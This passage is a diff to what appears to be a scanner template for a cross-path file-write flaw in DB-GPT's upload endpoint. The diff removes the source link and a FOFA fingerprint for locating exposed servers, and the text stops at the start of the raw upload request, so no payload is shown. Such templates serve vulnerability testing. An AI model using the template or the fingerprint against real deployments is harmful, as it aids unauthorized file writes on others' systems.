@@ -3,12 +3,8 @@ info:
   name: DB-GPT upload存在跨路径文件写入漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/bqdz8x9a6pd0ik5m'
+  description: ''
   tags: file-upload,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: bqdz8x9a6pd0ik5m
-    fofa: icon_hash="100632689"
 http:
 - raw:
   - 'POST /api/v1/python/file/upload HTTP/1.1
